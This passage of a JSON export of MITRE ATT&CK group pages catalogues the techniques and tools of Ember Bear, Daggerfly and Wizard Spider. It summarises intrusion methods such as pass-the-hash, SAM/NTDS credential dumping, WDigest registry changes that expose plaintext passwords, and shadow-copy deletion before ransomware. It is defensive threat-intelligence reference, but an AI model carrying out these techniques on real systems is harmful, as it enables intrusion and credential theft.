credentials.[1] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash Ember Bear has used pass-the-hash techniques for lateral movement in victim environments.[1] Enterprise T1078 .001 Valid Accounts: Default Accounts Ember Bear has abused default user names and passwords in externally-accessible IP cameras for initial access.[1] Enterprise T1125 Video Capture Ember Bear has exfiltrated images from compromised IP cameras.[1] Enterprise T1047 Windows Management Instrumentation Ember Bear has used WMI execution with password hashes for command execution and lateral movement.[1] Software ID Name References Techniques S0521 BloodHound Ember Bear has used BloodHound to profile Active Directory environments.[1] Account Discovery: Domain Account, Account Discovery: Local Account, Archive Collected Data, Command and Scripting Interpreter: PowerShell, Domain Trust Discovery, Group Policy Discovery, Native API, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote System Discovery, System Owner/User Discovery S0488 CrackMapExec Ember Bear used CrackMapExec during intrusions.[1] Account Discovery: Domain Account, Brute Force: Password Spraying, Brute Force: Password Guessing, Brute Force, Command and Scripting Interpreter: PowerShell, File and Directory Discovery, Modify Registry, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, OS Credential Dumping: LSA Secrets, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, Scheduled Task/Job: At, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0357 Impacket Ember Bear has used Impacket for lateral movement and process execution in victim environments.[2][1] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0508 ngrok Ember Bear used ngrok during intrusions against Ukrainian victims.[2] Dynamic Resolution: Domain Generation Algorithms, Exfiltration Over Web Service, Protocol Tunneling, Proxy, Web Service S0598 P.A.S. Webshell Ember Bear has used P.A.S. Webshell during intrusions.[1] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter, Data from Information Repositories, Data from Local System, Deobfuscate/Decode Files or Information, File and Directory Discovery, File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, Indicator Removal: File Deletion, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information, Server Software Component: Web Shell, Software Discovery S0029 PsExec Ember Bear has used PsExec through frameworks such as Impacket for remote command execution.[1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S1040 Rclone Ember Bear has used Rclone to exfiltrate information from victim environments.[1] Archive Collected Data: Archive via Utility, Data Transfer Size Limits, Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery S1187 reGeorg [2] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Python, Ingress Tool Transfer, Non-Application Layer Protocol, Protocol Tunneling, Proxy, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: SMB/Windows Admin Shares, Server Software Component: Web Shell S0174 Responder Ember Bear has used Responder in intrusions.[1] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Network Sniffing S1018 Saint Bot Ember Bear has used Saint Bot during operations, but is distinct from the threat actor Saint Bear.[1] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data from Local System, Debugger Evasion, Deobfuscate/Decode Files or Information, File and Directory Discovery, Hijack Execution Flow, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information, Obfuscated Files or Information: Software Packing, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Asynchronous Procedure Call, Process Injection: Process Hollowing, Query Registry, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: InstallUtil, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, User Execution: Malicious File, User Execution: Malicious Link, Virtualization/Sandbox Evasion: Time Based Evasion, Virtualization/Sandbox Evasion: System Checks S0689 WhisperGate Ember Bear is associated with WhisperGate use against multiple victims in Ukraine.[2][3][4] Access Token Manipulation: Create Process with Token, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Data Destruction, Deobfuscate/Decode Files or Information, Disk Wipe: Disk Structure Wipe, Disk Wipe: Disk Content Wipe, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading, Native API, Network Share Discovery, Obfuscated Files or Information: Encrypted/Encoded File, Pre-OS Boot: Bootkit, Process Injection: Process Hollowing, Reflective Code Loading, Software Discovery: Security Software Discovery, System Binary Proxy Execution: InstallUtil, System Information Discovery, System Services: Service Execution, System Shutdown/Reboot, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: Time Based Evasion, Web Service References US Cybersecurity & Infrastructure Security Agency et al. (2024, September 5). Russian Military Cyber Actors Target U.S. and Global Critical Infrastructure. Retrieved September 6, 2024. Microsoft Threat Intelligence. (2023, June 14). Cadet Blizzard emerges as a novel and distinct Russian threat actor. Retrieved July 10, 2023. CrowdStrike. (2022, March 30). Who is EMBER BEAR?. Retrieved June 9, 2022. Sadowski, J; Hall, R. (2022, March 4). Responses to Russia's Invasion of Ukraine Likely to Spur Retaliation. Retrieved June 9, 2022. Unit 42. (2022, February 25). Spear Phishing Attacks Target Organizations in Ukraine, Payloads Include the Document Stealer OutSteel and the Downloader SaintBot. Retrieved June 9, 2022. "
},
{
"id": 122,
"title": "Daggerfly, Evasive Panda, BRONZE HIGHLAND, Group G1034",
"path": "/groups/G1034/index.html",
"content": " Daggerfly Daggerfly is a People's Republic of China-linked APT entity active since at least 2012. Daggerfly has targeted individuals, government and NGO entities, and telecommunication companies in Asia and Africa. Daggerfly is associated with exclusive use of MgBot malware and is noted for several potential supply chain infection campaigns.[1][2][3][4] ID: G1034 \u24d8 Associated Groups: Evasive Panda, BRONZE HIGHLAND Contributors: Furkan Celik, PURE7 Version: 1.0 Created: 25 July 2024 Last Modified: 31 October 2024 Version Permalink Live Version Associated Group Descriptions Name Description Evasive Panda [1][4] BRONZE HIGHLAND [1][4] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Daggerfly uses HTTP for command and control communication.[4] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Daggerfly used PowerShell to download and execute remote-hosted files on victim systems.[1] Enterprise T1584 .004 Compromise Infrastructure: Server Daggerfly compromised web servers hosting updates for software as part of a supply chain intrusion.[4] Enterprise T1136 .001 Create Account: Local Account Daggerfly created a local account on victim machines to maintain access.[1] Enterprise T1587 .002 Develop Capabilities: Code Signing Certificates Daggerfly created code signing certificates to sign malicious macOS files.[4] Enterprise T1189 Drive-by Compromise Daggerfly has used strategic website compromise for initial access against victims.[4] Enterprise T1574 .001 Hijack Execution Flow: DLL Daggerfly has used legitimate software to side-load PlugX loaders onto victim systems.[1] Daggerfly is also linked to multiple other instances of side-loading for initial loading activity.[4] Enterprise T1105 Ingress Tool Transfer Daggerfly has used PowerShell and BITSAdmin to retrieve follow-on payloads from external locations for execution on victim machines.[1] Enterprise T1036 .003 Masquerading: Rename Legitimate Utilities Daggerfly used a renamed version of rundll32.exe, such as \"dbengin.exe\" located in the ProgramData\\Microsoft\\PlayReady directory, to proxy malicious DLL execution.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager Daggerfly used Reg to dump the Security Account Manager (SAM) hive from victim machines for follow-on credential extraction.[1] Enterprise T1012 Query Registry Daggerfly used Reg to dump the Security Account Manager (SAM), System, and Security Windows registry hives from victim machines.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Daggerfly has attempted to use scheduled tasks for persistence in victim environments.[4] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Daggerfly has used signed, but not notarized, malicious files for execution in macOS environments.[4] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain Daggerfly is associated with several supply chain compromises using malicious updates to compromise victims.[2][4] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 Daggerfly proxied execution of malicious DLLs through a renamed rundll32.exe binary.[1] Enterprise T1082 System Information Discovery Daggerfly utilizes victim machine operating system information to create custom User Agent strings for subsequent command and control communication.[4] Enterprise T1204 .001 User Execution: Malicious Link Daggerfly has used strategic website compromise to deliver a malicious link requiring user interaction.[4] Software ID Name References Techniques S0190 BITSAdmin Daggerfly has used BITSAdmin to retrieve files from remote locations to run on victim systems.[1] BITS Jobs, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S1016 MacMa Daggerfly is linked to the use and potentially development of MacMa through overlapping command and control infrastructure and shared libraries with other unique tools.[3] Audio Capture, Command and Scripting Interpreter: Unix Shell, Create or Modify System Process: Launch Agent, Credentials from Password Stores: Keychain, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Clear Linux or Mac System Logs, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Native API, Non-Application Layer Protocol, Non-Standard Port, Process Discovery, Remote Services, Screen Capture, Subvert Trust Controls: Code Signing, Subvert Trust Controls: Gatekeeper Bypass, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S1146 MgBot Daggerfly is uniquely associated with the use of MgBot since at least 2012.[2] Account Discovery: Domain Account, Account Discovery: Local Account, Audio Capture, Clipboard Data, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Data from Information Repositories, Data from Local System, Data from Removable Media, Domain Trust Discovery, Input Capture: Keylogging, Network Service Discovery, OS Credential Dumping, Process Discovery, Remote System Discovery, Steal Web Session Cookie, System Owner/User Discovery S1147 Nightdoor Daggerfly uses Nightdoor as a backdoor mechanism for Windows hosts.[4][3] Application Layer Protocol, Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Hijack Execution Flow, Indicator Removal: File Deletion, Process Discovery, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery, Virtualization/Sandbox Evasion: System Checks, Web Service S0013 PlugX Daggerfly has used PlugX loaders as part of intrusions.[1] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0075 Reg Daggerfly has used Reg to dump various Windows registry hives from victim machines.[1] Modify Registry, Query Registry, Unsecured Credentials: Credentials in Registry References Threat Hunter Team. (2023, April 20). Daggerfly: APT Actor Targets Telecoms Company in Africa. Retrieved July 25, 2024. Facundo Mu\u00f1oz. (2023, April 26). Evasive Panda APT group delivers malware via updates for popular Chinese software. Retrieved July 25, 2024. Threat Hunter Team. (2024, July 23). Daggerfly: Espionage Group Makes Major Update to Toolset. Retrieved July 25, 2024. Ahn Ho, Facundo Mu\u00f1oz, & Marc-Etienne M.L\u00e9veill\u00e9. (2024, March 7). Evasive Panda leverages Monlam Festival to target Tibetans. Retrieved July 25, 2024. "
},
{
"id": 123,
"title": "Wizard Spider, UNC1878, TEMP.MixMaster, Grim Spider, FIN12, GOLD BLACKBURN, ITG23, Periwinkle Tempest, DEV-0193, Group G0102",
"path": "/groups/G0102/index.html",
"content": " Wizard Spider Wizard Spider is a Russia-based financially motivated threat group originally known for the creation and deployment of TrickBot since at least 2016. Wizard Spider possesses a diverse arsenal of tools and has conducted ransomware campaigns against a variety of organizations, ranging from major corporations to hospitals.[1][2][3] ID: G0102 \u24d8 Associated Groups: UNC1878, TEMP.MixMaster, Grim Spider, FIN12, GOLD BLACKBURN, ITG23, Periwinkle Tempest, DEV-0193 Contributors: Edward Millington; Oleksiy Gayda Version: 4.0 Created: 12 May 2020 Last Modified: 12 March 2025 Version Permalink Live Version Associated Group Descriptions Name Description UNC1878 [4] TEMP.MixMaster [5] Grim Spider [1][6] FIN12 [7] GOLD BLACKBURN [8] ITG23 [9] Periwinkle Tempest [10] DEV-0193 [10] Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account Wizard Spider has identified domain admins through the use of net group \"Domain admins\" /DOMAIN. Wizard Spider has also leveraged the PowerShell cmdlet Get-ADComputer to collect account names from Active Directory data.[11][7] Enterprise T1557 .001 Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay Wizard Spider has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning.[4] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Wizard Spider has used HTTP for network communications.[6] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Wizard Spider has archived data into ZIP files on compromised machines.[7] Enterprise T1197 BITS Jobs Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine.[7] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Wizard Spider has established persistence via the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and a shortcut within the startup folder.[2][4] .004 Boot or Logon Autostart Execution: Winlogon Helper DLL Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[4] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Wizard Spider has used macros to execute PowerShell scripts to download malware on victim's machines.[6] It has also used PowerShell to execute commands and move laterally through a victim network.[2][4][12][7] .003 Command and Scripting Interpreter: Windows Command Shell Wizard Spider has used cmd.exe to execute commands on a victim's machine.[11][7] Enterprise T1136 .001 Create Account: Local Account Wizard Spider has created local administrator accounts to maintain persistence in compromised networks.[7] .002 Create Account: Domain Account Wizard Spider has created and used new accounts within a victim's Active Directory environment to maintain persistence.[7] Enterprise T1543 .003 Create or Modify System Process: Windows Service Wizard Spider has installed TrickBot as a service named ControlServiceA in order to establish persistence.[6][7] Enterprise T1555 .004 Credentials from Password Stores: Windows Credential Manager Wizard Spider has used PowerShell cmdlet Invoke-WCMDump to enumerate Windows credentials in the Credential Manager in a compromised network.[7] Enterprise T1005 Data from Local System Wizard Spider has collected data from a compromised host prior to exfiltration.[7] Enterprise T1074 Data Staged Wizard Spider has collected and staged credentials and network enumeration information, using the networkdll and psfin TrickBot modules.[6] .001 Local Data Staging Wizard Spider has staged ZIP files in local directories such as, C:\\PerfLogs\\1\\ and C:\\User\\1\\ prior to exfiltration.[7] Enterprise T1585 .002 Establish Accounts: Email Accounts Wizard Spider has leveraged ProtonMail email addresses in ransom notes when delivering Ryuk ransomware.[7] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol Wizard Spider has exfiltrated victim information using FTP.[11][13] Enterprise T1041 Exfiltration Over C2 Channel Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.[6][7] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Wizard Spider has exfiltrated stolen victim data to various cloud storage providers.[7] Enterprise T1210 Exploitation of Remote Services Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.[4][11][14] Enterprise T1133 External Remote Services Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.[4] Enterprise T1222 .001 File and Directory Permissions Modification: Windows File and Directory Permissions Modification Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.[15] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.[2][4][11][7] Enterprise T1070 .004 Indicator Removal: File Deletion Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use.[6] Enterprise T1105 Ingress Tool Transfer Wizard Spider can transfer malicious payloads such as ransomware to compromised machines.[7] Enterprise T1490 Inhibit System Recovery Wizard Spider has used WMIC and vssadmin to manually delete volume shadow copies. Wizard Spider has also used Conti ransomware to delete volume shadow copies automatically with the use of vssadmin.[7] Enterprise T1570 Lateral Tool Transfer Wizard Spider has used stolen credentials to copy tools into the %TEMP% directory of domain controllers.[6] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf.[6] It has also used common document file names for other malware binaries.[4] Enterprise T1112 Modify Registry Wizard Spider has modified the Registry key HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory. Wizard Spider has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.[6][7] Enterprise T1135 Network Share Discovery Wizard Spider has used the \"net view\" command to locate mapped network shares.[2] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Wizard Spider used Base64 encoding to obfuscate an Empire service and PowerShell commands.[5][11] Enterprise T1588 .002 Obtain Capabilities: Tool Wizard Spider has utilized tools such as Empire, Cobalt Strike, Cobalt Strike, Rubeus, AdFind, BloodHound, Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts.[4][7] .003 Obtain Capabilities: Code Signing Certificates Wizard Spider has obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads.[13][7] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Wizard Spider has dumped the lsass.exe memory to harvest credentials with the use of open-source tool LaZagne.[7] .002 OS Credential Dumping: Security Account Manager Wizard Spider has acquired credentials from the SAM/SECURITY registry hives.[4] .003 OS Credential Dumping: NTDS Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database. Wizard Spider has also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility, ntdsutil.[4][7] Enterprise T1566 .001 Phishing: Spearphishing Attachment Wizard Spider has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar.[6][12][7] .002 Phishing: Spearphishing Link Wizard Spider has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.[2][13] Enterprise T1055 Process Injection Wizard Spider has used process injection to execute payloads to escalate privileges.[7] .001 Dynamic-link Library Injection Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions.[2][13] Enterprise T1021 Remote Services Wizard Spider has used the WebDAV protocol to execute Ryuk payloads hosted on network file shares.[7] .001 Remote Desktop Protocol Wizard Spider has used RDP for lateral movement and to deploy ransomware interactively.[6][2][13][7] .002 SMB/Windows Admin Shares Wizard Spider has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.[13][11] .006 Windows Remote Management Wizard Spider has used Window Remote Management to move laterally through a victim network.[2] Enterprise T1018 Remote System Discovery Wizard Spider has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. Wizard Spider has also used AdFind, nltest/dclist, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller.[5][6][4][12][11][7] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Wizard Spider has used scheduled tasks to establish persistence for TrickBot and other malware.[6][2][4][13][7] Enterprise T1489 Service Stop Wizard Spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.[11] Enterprise T1518 Software Discovery Wizard Spider has utilized the PowerShell script Get-DataInfo.ps1 to collect installed backup software information from a compromised machine.[7] .001 Security Software Discovery Wizard Spider has used WMI to identify anti-virus products installed on a victim's machine.[11] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.[11][4][2][13][7] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Wizard Spider has used Digicert code-signing certificates for some of its malware.[13] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 Wizard Spider has utilized rundll32.exe to deploy ransomware commands with the use of WebDAV.[7] Enterprise T1082 System Information Discovery Wizard Spider has used Systeminfo and similar commands to acquire detailed configuration information of a victim's machine. Wizard Spider has also utilized the PowerShell cmdlet Get-ADComputer to collect DNS hostnames, last logon dates, and operating system information from Active Directory.[11][7] Enterprise T1016 System Network Configuration Discovery Wizard Spider has used ipconfig to identify the network configuration of a victim machine. Wizard Spider has also used the PowerShell cmdlet Get-ADComputer to collect IP address data from Active Directory.[15][7] Enterprise T1033 System Owner/User Discovery Wizard Spider has used \"whoami\" to identify the local user and their privileges.[15] Enterprise T1569 .002 System Services: Service Execution Wizard Spider has used services.exe to execute scripts and executables during lateral movement within a victim's network. Wizard Spider has also used batch scripts that leverage PsExec to execute a previously transferred ransomware payload on a victim's network.[11][14][7] Enterprise T1552 .006 Unsecured Credentials: Group Policy Preferences Wizard Spider has used PowerShell cmdlets Get-GPPPassword and Find-GPOPassword to find unsecured credentials in a compromised network group policy.[7] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash Wizard Spider has used the Invoke-SMBExec PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally.[7] Enterprise T1204 .001 User Execution: Malicious Link Wizard Spider has lured victims into clicking a malicious link delivered through spearphishing.[2] .002 User Execution: Malicious File Wizard Spider has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar.[6][3][7] Enterprise T1078 Valid Accounts Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers.[6][7] .002 Domain Accounts Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network.[4] Enterprise T1047 Windows Management Instrumentation Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally. Wizard Spider has also used batch scripts to leverage WMIC to deploy ransomware.[6][2][4][12][7] Software ID Name References Techniques S0552 AdFind [5][11][13][12][7] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0504 Anchor [16] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Unix Shell, Create or Modify System Process: Windows Service, Execution Guardrails, Fallback Channels, Hide Artifacts: NTFS File Attributes, Indicator Removal: File Deletion, Ingress Tool Transfer, Non-Application Layer Protocol, Obfuscated Files or Information, Obfuscated Files or Information: Software Packing, Remote Services: SMB/Windows Admin Shares, Scheduled Task/Job: Scheduled Task, Scheduled Task/Job: Cron, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery, System Services: Service Execution S0534 Bazar [3][16] Account Discovery: Domain Account, Account Discovery: Local Account, Application Layer Protocol: Web Protocols, BITS Jobs, Boot or Logon Autostart Execution: Winlogon Helper DLL, Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data from Local System, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Dynamic Resolution: Domain Generation Algorithms, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Indicator Removal: Clear Persistence, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, Masquerading: Double File Extension, Multi-Stage Channels, Native API, Network Share Discovery, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Dynamic API Resolution, Obfuscated Files or Information: Software Packing, Phishing: Spearphishing Link, Process Discovery, Process Injection, Process Injection: Process Doppelg\u00e4nging, Process Injection: Process Hollowing, Query Registry, Remote System Discovery, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, Software Discovery, Subvert Trust Controls: Code Signing, System Information Discovery, System Location Discovery: System Language Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery, User Execution: Malicious Link, Virtualization/Sandbox Evasion, Virtualization/Sandbox Evasion: Time Based Evasion, Web Service, Windows Management Instrumentation S0190 BITSAdmin [7] BITS Jobs, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0521 BloodHound [2][4][15][7] Account Discovery: Domain Account, Account Discovery: Local Account, Archive Collected Data, Command and Scripting Interpreter: PowerShell, Domain Trust Discovery, Group Policy Discovery, Native API, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote System Discovery, System Owner/User Discovery S0154 Cobalt Strike [4][2][11][13][14][15][3][7] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0575 Conti [3][7][16] Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, Deobfuscate/Decode Files or Information, File and Directory Discovery, Inhibit System Recovery, Native API, Network Share Discovery, Obfuscated Files or Information, Process Discovery, Process Injection: Dynamic-link Library Injection, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, Service Stop, System Network Configuration Discovery, System Network Connections Discovery, Taint Shared Content S0659 Diavol [16] Application Layer Protocol: Web Protocols, Data Destruction, Data Encrypted for Impact, Defacement: Internal Defacement, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Inhibit System Recovery, Native API, Network Share Discovery, Obfuscated Files or Information: Steganography, Obfuscated Files or Information, Process Discovery, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, Service Stop, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S0024 Dyre [17][18][19] Application Layer Protocol: Web Protocols, Create or Modify System Process: Windows Service, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Ingress Tool Transfer, Obfuscated Files or Information: Software Packing, Process Injection: Dynamic-link Library Injection, Process Injection, Scheduled Task/Job: Scheduled Task, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery, Virtualization/Sandbox Evasion: System Checks S0367 Emotet [6][15] Access Token Manipulation: Token Impersonation/Theft, Account Discovery: Email Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Brute Force: Password Guessing, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command 